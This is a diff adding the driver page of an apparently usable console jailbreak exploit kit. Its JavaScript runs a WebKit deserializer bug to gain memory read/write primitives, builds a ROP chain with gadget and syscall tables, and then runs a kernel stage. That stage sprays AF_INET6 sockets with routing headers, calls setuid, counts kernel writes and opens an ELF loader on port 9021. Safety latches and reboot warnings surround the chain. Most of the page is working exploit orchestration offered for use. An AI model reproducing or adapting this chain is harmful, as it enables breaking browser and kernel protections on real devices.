+        + "; errno convention (measured): " + errConvention);
+    lines.push("threads: " + state.threadsCreated + " created, "
+        + state.threadsExited + " confirmed exited"
+        + (state.tornWrites.length
+            ? "; torn slot writes: " + state.tornWrites.join(",") : ""));
+    if (stranded.length)
+        lines.push("descriptors left open on purpose ("
+            + (sweepBlocked ? "sweep blocked: " + sweepBlocked + "; " : "")
+            + noClose.size + " named by cleanup as do-not-close, "
+            + state.fdOpen.size + " still tracked): "
+            + stranded.join(",") + "");
+    lines.push("not built, DELIBERATELY: stage 3 and everything after it");
+    if (aborted) lines.push("run stopped at '" + aborted + "'.");
+    if (FILTERED_RUN)
+        lines.push("this was A filtered pass ("
+            + (ONLY.length ? "?only=" + ONLY.join(",") : "?from=" + FROM)
+            + "). It can only account for what IT did.");
+    summaryEl.textContent = lines.join("\n");
+
+    flushMark("POOPS-COMPLETE", "pass=" + passed + "-fail=" + failed
+        + "-skip=" + skipped + "-reboot=" + (mustReboot ? 1 : 0)
+        + "-triggered=" + (engine && engine.triggered ? 1 : 0)
+        + "-rtmean=" + rtMean + "-filtered=" + (FILTERED_RUN ? 1 : 0));
+
+    const payloadSuccess = cfg.payload === "1" && elfldrSpawned;
+    const fullSuccess = payloadSuccess || (failed === 0 && !aborted
+        && !FILTERED_RUN && !chainDead && !state.cleanupFailed);
+
+    if (fullSuccess) {
+        clearFailureBanners();
+        setCatResult(true);
+        showVerdict(false, payloadSuccess
+            ? "ELF LOADER READY -- returning to the payload menu."
+            : "SUCCESS -- all executed checks passed."
+                + (mustReboot
+                    ? "\n\nThe jailbreak changed this boot's kernel state; reboot before running it again."
+                    : "\n\nCleanup completed and the run may be repeated safely."));
+    } else if (mustReboot) {
+        setCatResult(false);
+        showVerdict(true, (v ? v.text : "reboot now -- the state report and "
+            + "cleanup row (PS7) never ran"
+            + (chainDead ? ", because the ROP chain died at '" + chainDead
+                + "'"
+                : ", so nothing has been verified and this page cannot claim "
+                + "anything was put back."))
+            + "\n\nREBOOT NOW"
+            + (v && v.all.length > 1
+                ? "\n\nAll reasons:\n  - " + v.all.join("\n  - ") : ""));
+    } else {
+
+        const ver = (v && v.verified) || {};
+        setCatResult(false);
+        showVerdict(false, "you are fine -- nothing was triggered and " + "everything this page can check was put back.\n"
+            + (ver.teardown ? "freed and closed socket by socket"
+                : "teardown had nothing to do")
+            + "; racers " + (ver.racers ? "confirmed exited" : "NOT confirmed")
+            + "; scheduler affinity "
+            + (ver.schedAff ? "read back" : "NOT read back")
+            + " and priority " + (ver.schedPrio ? "read back" : "NOT read back")
+            + "; descriptors left open on purpose: " + stranded.length
+            + "; kernel writes: " + (ver.kernelWrites === undefined
+                ? "0" : ver.kernelWrites) + ".");
+    }
+
+    const finalLatch = await latch.read();
+    if (!mustReboot && !failed && !aborted && !FILTERED_RUN && !stranded.length
+        && !chainDead && !state.cleanupFailed) {
+        const l = await latch.clear();
+        flushMark("LATCH-RELEASED", "set=" + (l.set ? 1 : 0));
+        lines.push("one-shot latch RELEASED: this run put everything back and "
+            + "verified it.");
+    } else {
+        flushMark("LATCH-HELD", "reboot=" + mustReboot + "-failed=" + failed
+            + "-aborted=" + (aborted || "no") + "-filtered=" + FILTERED_RUN);
+        lines.push("ONE-shot latch still held"
+            + (finalLatch.set ? "" : " (or never took)")
+            + "");
+    }
+    summaryEl.textContent = lines.join("\n");
+
+    if (!aborted && !FILTERED_RUN) storeDel(PROGRESS_KEY);
+    storeSet(RUNLOG_KEY, JSON.stringify({
+        v: 2, rev: REV, ts: Date.now(),
+        trigger: cfg.trigger, burn: cfg.burn,
+        stoppedAt: aborted || "", filtered: FILTERED_RUN,
+        pass: passed, fail: failed, skip: skipped,
+        reboot: mustReboot,
+        triggered: engine ? engine.triggered : "",
+        corrupt: engine ? engine.corrupt : "",
+        triplets: engine && engine.TW.tripletsValid()
+            ? engine.TW.S.triplets.join(",") : "",
+        setuidCalls: engine ? engine.S.setuidCalls : 0,
+        kernelWrites: engine ? engine.kernelWrites : 0,
+        socketsLeft: engine ? engine.TW.S.n : 0,
+        chainDead: chainDead, cleanupFailed: state.cleanupFailed,
+        latchDetail: (finalLatch && finalLatch.detail) || ""
+    }));
+
+    if (payloadSuccess)
+        stage("ELF LOADER READY -- opening payload menu", "ok");
+    else if (fullSuccess)
+        stage("SUCCESS -- " + passed + " PASS / 0 FAIL", "ok");
+    else if (mustReboot)
+        stage("reboot required -- " + passed + " PASS / " + failed + " FAIL", "bad");
+    else if (failed || aborted)
+        stage("FAILED -- " + passed + " PASS / " + failed + " FAIL", "bad");
+    else
+        stage("stages 0-2 complete, nothing triggered, everything put back -- "
+            + passed + " PASS", "ok");
+
+    if (payloadSuccess) {
+        flushMark("ELFLDR-MENU-INPAGE",
+            "no-navigation-parked-racers-and-fds-remain-owned-port=9021");
+        showPayloadMenu();
+    }
+}
+
+async function bootChain() {
+    const bootTimer = setTimeout(() => {
+        flushMark("BOOT-STALLED", "ms=45000-stage=boot-nothing-changed-yet");
+        stage("boot is taking more than 45 s");
+    }, 45000);
+    try {
+        stage("preflight");
+        await preflight();
+        refuseReferenceChain();
+        await bootPrimitiveAndChain();
+    } finally {
+        clearTimeout(bootTimer);
+    }
+}
+
+async function bootPrimitiveAndChain() {
+    if (globalThis.p && typeof globalThis.p.read8 === "function") {
+        flushMark("PRIMITIVE-REUSED", "window.p was already published");
+    } else if (typeof window.jbReady === "object" && window.jbReady !== null
+        && typeof window.jbReady.then === "function") {
+        stage("waiting for the primitive");
+        await window.jbReady;
+        flushMark("PRIMITIVE-REUSED", "via-window.jbReady");
+    } else if (typeof window.run_slopkit === "function") {
+        stage("running slopkit's deserializer bug through window.run_slopkit");
+        await window.run_slopkit(window.fw_str);
+        flushMark("PRIMITIVE-REUSED", "via-window.run_slopkit");
+    } else {
+        stage("running the webkit bug -- placement is ~1 attempt in 3, it "
+            + "retries itself");
+
+        // A killed/reloaded WebProcess can restore this history entry with the
+        // previous 65k-object SerializedScriptValue graph still attached.  If
+        // we build the next graph before releasing it, 9.00 can hit its memory
+        // ceiling almost immediately.  Purge it before any exploit allocation.
+        flushMark("PRIMITIVE-HISTORY-PURGE-PRE", "replace-state-null");
+        try {
+            history.replaceState(null, "");
+        } catch (e) {
+            flushMark("PRIMITIVE-HISTORY-PURGE-FAIL",
+                (e && e.name ? e.name : "Error") + ":" + String(e && e.message || e));
+            throw e;
+        }
+        if (typeof globalThis.gc === "function") {
+            try { globalThis.gc(); } catch (e) { }
+        }
+        await new Promise(resolve => setTimeout(resolve, 750));
+        flushMark("PRIMITIVE-HISTORY-PURGED", "settled-ms=750");
+
+        const carrier = await establishPrimitive({
+            maxAttempts: MAX_ATTEMPTS,
+            onEvent(tag, detail, attempt) {
+                if (tag === "ATTEMPT-START") {
+                    // This is before the large graph is built, so make the
+                    // checkpoint durable if the WebProcess dies during setup.
+                    flushMark(tag, detail);
+                    stage("exploit attempt " + attempt + " -- waiting for placement");
+                } else {
+                    queueEvent(tag, detail);
+                }
+            },
+            beforeCriticalLoad(fake, target) {
+                queueEvent("CRITICAL-LOAD-NEXT", "fake=0x" + fake.toString(16)
+                    + "-target=0x" + target.toString(16));
+                void scrEl.offsetWidth;
+                flushQueue(false);
+            }
+        });
+        nogcHard.carrier = carrier;
+        installWindowP(carrier, { onEvent: queueEvent });
+        // installWindowP() promotes the primitive to a self-contained pair of
+        // real typed arrays.  Keeping the obsolete fake carrier here defeats
+        // core.js's release and can retain the 72 MB addrof carrier graph.
+        nogcHard.carrier = null;
+        if (typeof globalThis.gc === "function") {
+            try { globalThis.gc(); } catch (e) { }
+        }
+        // Give JSC an idle turn to reclaim the released carrier/groom before
+        // prepare() creates its worker ROP stack and the kernel-stage arenas.
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        flushMark("PRIMITIVE-MEMORY-RELIEF",
+            "fake-carrier-dropped=1-history-state-null="
+            + (history.state === null));
+        // The landing page preloads the small UI image so it remains visually
+        // stable while this page transitions into its live log view.
+        flushMark("PRIMITIVE-UP", "attempt=" + carrier.attempts
+            + "-paired=" + pairStatus.promoted
+            + "-released=" + fakeCellReleased());
+        if (!pairStatus.promoted)
+            throw new Error("the (main, worker) pair was NOT promoted ("
+                + pairStatus.error + ")");
+    }
+
+    const p = globalThis.p;
+    if (!p || typeof p.read8 !== "function")
+        throw new Error("window.p was never published");
+    nogcHard.p = p;
+    assertInt64Identity();
+
+    stage("loading poops_lib / threads_lib / twin_lib / poops_stages");
+    await loadPoopsModules();
+
+    const handoff = window.jbPrepared || null;
+    let prepared;
+    if (handoff && handoff.chain && handoff.p
+        && typeof handoff.chain.syscall === "function"
+        && handoff.p.syscalls !== undefined) {
+        prepared = handoff;
+        flushMark("CHAIN-REUSED", "window.jbPrepared");
+    } else {
+        stage("prepare(): module bases, gadget/syscall tables, worker hijack");
+        flushMark("PREP-ENTER", "");
+        prepared = await prepare(p);
+        flushMark("PREP-OK", "getpid-passed-inside-prepare");
+    }
+    P = prepared.p;
+    chain = prepared.chain;
+    nogcHard.chain = chain;
+
+    flushMark("POST-PREP", "next=assertBases");
+    assertBases();
+    await probeErrnoConvention();
+}
+
+async function main() {
+    if (runInFlight) {
+        flushMark("DOUBLE-RUN-BLOCKED", "main-already-in-flight");
+        return;
+    }
+    flushMark("POOPS-BOOT", "rev=" + REV + "-trigger=" + cfg.trigger
+        + "-burn=" + cfg.burn + "-sockets=" + cfg.sockets
+        + "-attempts=" + cfg.attempts + "-from=" + (FROM || "none")
+        + "-only=" + (ONLY.join(".") || "none")
+        + "-stalledAt=" + (STALLED_AT || "none"));
+    lockNav(true);
+    runInFlight = true;
+    document.body.classList.add("exploit-running");
+    try {
+        await bootChain();
+
+        await chooseCore();
+
+        makeContext();
+        const self = await engine.H.thrSelf("driver");
+        driver.tid = self.tid;
+        const r0 = await engine.H.readRtprio("driver-original");
+        driver.origPrioType = r0.type;
+        driver.origPrio = r0.prio;
+        const pid = await sys(0x014);
+        driver.pid = pid.failed ? 0 : pid.s32;
+        flushMark("DRIVER-IDENTITY", "pid=" + driver.pid + "-tid=" + driver.tid
+            + "-mask=" + driver.origMaskHex + "-rtprio=" + driver.origPrioType
+            + "/" + driver.origPrio + "-core=" + driver.core);
+
+        flushMark("PRE-FD-BASELINE", "next=socket(AF_UNIX,SOCK_STREAM)");
+        const first = await sys(0x061, K.AF_UNIX, K.SOCK_STREAM, 0);
+        if (!first.failed) {
+            state.fdBaseline = first.s32;
+            await sys(0x006, state.fdBaseline);
+        }
+        flushMark("FD-BASELINE", "fd=" + state.fdBaseline);
+
+        vitals(vitalsText("about to open "));
+        cfgEl.textContent =
+            "trigger: " + cfg.trigger
+            + (cfg.trigger === "overflow" ? "   burn: " + cfg.burn : "")
+            + "   |   stage-0 attempts: " + cfg.attempts
+            + "   |   twin scan: " + (PK ? PK.MAX_ROUNDS_TWIN : 10)
+            + " rounds at BATCH 1 (twin_lib REFUSES batch>1 once a trigger "
+            + "exists)\n"
+            + "spray bank: " + cfg.sockets + " AF_INET6 sockets x 360-byte "
+            + "type-0 routing header (poops.c:38, :45)\n"
+            + "target core " + driver.core + " -- " + driver.coreWhy + "\n"
+            + "driver tid " + (driver.tid || "unknown") + " in pid " + driver.pid
+            + "; will put back mask " + driver.origMaskHex + " and rtprio "
+            + driver.origPrioType + "/" + driver.origPrio + "\n" + "chain watchdog " + WATCHDOG_MS + " ms per round trip; every loop " + "on this page is bounded by an iteration count AND a wall clock, " + "and every wait has a deadline.\n";
+
+        stage("running the ladder -- one row at a time");
+        try {
+            await runLadder();
+        } finally {
+            if (chainDead)
+                danger("cleanup impossible: the ROP chain died at '" + chainDead
+                    + "'.\nUp to " + (engine ? engine.TW.S.n : 0) + " AF_INET6 "
+                    + "sockets, their 360-byte kernel routing headers, twelve "
+                    + "realtime kernel threads pinned to core " + driver.core
+                    + ", and this WebProcess's raised fd limit are all still " + "live, and NOTHING in a later page load can reach a " + "descriptor or a thread in a process it does not own"
+                    + (driver.tid
+                        ? "\nThe driver thread is tid " + driver.tid + " in pid "
+                        + driver.pid + " and that has been written down: a " + "later load CAN restore its affinity and priority by " + "explicit TID"
+                        : "")
+                    + "\nREBOOT.");
+        }
+    } finally {
+        runInFlight = false;
+        document.body.classList.remove("exploit-running");
+        lockNav(false);
+    }
+}
+
+async function clearMain() {
+    const before = await latch.read();
+    const after = await latch.clear();
+    stage(before.set
+        ? "one-shot latch CLEARED. It was set by: " + (before.detail || "?")
+        : "the latch was not set; nothing to clear.", "ok");
+    summaryEl.textContent =
+        "before: " + JSON.stringify(before) + "\nafter:  " + JSON.stringify(after)
+        + (ARMED ? "\n\n?go=1 was present on this URL and was IGNORED: ?clear=1 "
+            + "is checked first and returns." : "")
+        + "\n\nNOTHING else was done";
+    renderNav(STALLED_AT, false);
+}
+
+function renderNav() {
+    navEl.textContent = "";
+    navEl.style.display = "none";
+}
+
+function lastRunText() {
+    if (!LAST_RUN) return "";
+    const age = Math.round((Date.now() - (LAST_RUN.ts || 0)) / 1000);
+    return "\nLAST recorded run (" + age + " s ago, trigger=" + LAST_RUN.trigger
+        + "): " + (LAST_RUN.stoppedAt ? "stopped at '" + LAST_RUN.stoppedAt + "'"
+            : "completed")
+        + ", " + LAST_RUN.pass + " pass / " + LAST_RUN.fail + " fail"
+        + (LAST_RUN.reboot ? "\n  that run'S verdict was: REBOOT." : "")
+        + (LAST_RUN.triggered ? "\n  the trigger fired: " + LAST_RUN.triggered
+            : "")
+        + (LAST_RUN.corrupt ? "\n  an alias was observed: " + LAST_RUN.corrupt
+            : "")
+        + (LAST_RUN.triplets ? "\n  triplet established: " + LAST_RUN.triplets
+            : "")
+        + (LAST_RUN.setuidCalls ? "\n  setuid(1) was called "
+            + LAST_RUN.setuidCalls + " time(s) -- IRREVERSIBLE for that boot, "
+            + "so the trigger's own precondition (a fresh, singly-referenced "
+            + "cred) no longer holds in that WebProcess" : "")
+        + (LAST_RUN.kernelWrites ? "\n  kernel writes recorded: "
+            + LAST_RUN.kernelWrites : "")
+        + (LAST_RUN.chainDead ? "\n  chain died at '" + LAST_RUN.chainDead + "'"
+            : "")
+        + (LAST_RUN.latchDetail ? "\n  latch detail recorded by that run: "
+            + LAST_RUN.latchDetail : "");
+}
+
+(async function entry() {
+
+    screenLine("slopkit -- reading the one-shot safety latch");
+
+    if (CLEARLATCH) {
+        renderNav("", false);
+        await clearMain();
+        return;
+    }
+
+    stage("checking the one-shot safety latch");
+    const l = await latch.read();
+    flushMark("LATCH-READ", "set=" + (l.set ? 1 : 0)
+        + "-detail=" + clean(l.detail || ""));
+
+    // Legacy links may still contain ?auto=1. Automatic latch clearing cannot
+    // prove that the console rebooted, so it is always refused once set.
+    if (l.set && AUTOCLEAR) {
+        flushMark("LATCH-AUTOCLEAR-BLOCKED", clean(l.detail || ""));
+        stage("automatic re-arm blocked: a browser page cannot prove that "
+            + "the console rebooted. Reboot before starting another attempt.",
+            "bad");
+    }
+
+    if (l.set) {
+        renderNav(STALLED_AT, true);
+        stage("ONE-SHOT SAFETY LOCK ACTIVE, set by: "
+            + (l.detail || "(no detail)")
+            + "\n\nReboot the console before another attempt. Do not reload or "
+            + "re-arm this exploit in the same boot.", "bad");
+        summaryEl.textContent = lastRunText();
+        flushMark("POOPS-LATCHED", clean(l.detail || ""));
+        return;
+    }
+
+    if (!ARMED) {
+        document.getElementById("arm").hidden = false;
+        renderNav(STALLED_AT, false);
+        stage("not armed" + (STALLED_AT ? " -- and the last run stopped at '"
+            + STALLED_AT + "'" : ""));
+        vitals(vitalsText("if armed with ?go=1 this page will open "));
+
+        if (cfg.trigger !== "none"
+            && !(cfg.trigger === "overflow" && cfg.burn !== "full")) {
+            showVerdict(true, "this selection will leave the console needing A " + "REBOOT.\n");
+            navEl.textContent = "";
+            link("?go=1&trigger=" + cfg.trigger
+                + (cfg.trigger === "overflow" ? "&burn=" + cfg.burn : ""),
+                "ARM  " + cfg.trigger.toUpperCase()
+                + (cfg.trigger === "overflow" ? " / BURN=" + cfg.burn : "")
+                + "  -- I accept that this console will need A REBOOT",
+                "one hot");
+
+            link("?trigger=none", "no -- go back to the negative control",
+                "extra");
+            link("../index.html", "back to slopkit", "extra");
+        }
+        summaryEl.textContent = lastRunText()
+            + "\n\nSAME-process re-arm checks, and their limit stated honestly: " + "this page records the first socket fd it is given and the " + "process's uid, and can therefore notice that THIS WebProcess has " + "already run";
+        flushMark("POOPS-IDLE", "rev=" + REV + "-armed=0-trigger=" + cfg.trigger);
+        return;
+    }
+
+    if (STALLED_AT && !FROM && !ONLY.length) {
+
+        renderNav(STALLED_AT, false);
+        stage("the last run stopped at '" + STALLED_AT + "' but the latch is "
+            + "clear, so pick a row explicitly", "bad");
+        summaryEl.textContent = lastRunText();
+        flushMark("POOPS-STALLED", STALLED_AT);
+        return;
+    }
+
+    renderNav("", false);
+    main().catch(err => {
+        const m = (err && err.message) || String(err);
+        stage("boot failed: " + m, "bad");
+        failCurrentHud("CHAIN STOPPED // CHECK SAFETY LOCK");
+        setCatResult(false);
+        flushMark("POOPS-FAILED", (err && err.name) + ":" + m.slice(0, 160));
+    });
+})();
+</script>
+</body>
+</html>
